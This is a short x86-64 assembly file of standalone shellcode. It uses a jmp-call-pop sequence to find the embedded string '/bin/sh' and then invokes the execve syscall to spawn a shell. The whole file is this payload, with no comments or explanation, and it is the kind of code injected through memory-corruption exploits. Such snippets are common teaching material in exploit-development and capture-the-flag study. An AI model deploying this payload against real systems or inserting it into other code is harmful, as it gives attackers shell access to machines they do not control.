jmp j2

j1: 
	jmp start

j2:
	call j1

db "/bin/sh", 0

start:
	pop rdi
	xor rax, rax
	mov rax, 0x3b
	xor rsi, rsi
	xor rdx, rdx
	syscall
